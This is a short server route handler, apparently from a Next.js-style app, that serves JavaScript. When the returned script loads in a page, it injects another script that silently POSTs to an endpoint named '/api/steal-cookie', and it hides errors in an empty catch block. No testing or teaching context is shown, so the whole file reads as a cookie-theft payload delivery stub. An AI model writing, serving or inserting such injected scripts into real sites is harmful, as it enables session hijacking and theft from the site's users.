export async function GET() {
    return new Response(`
      (function () {
        try {
          const s = document.createElement('script');
          s.innerHTML = \`
            fetch('/api/steal-cookie', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
            });
          \`;
          document.body.appendChild(s);
        } catch (e) {}
      })();
    `, {
      headers: {
        "Content-Type": "application/javascript",
        "Cache-Control": "no-store"
      },
    });
  }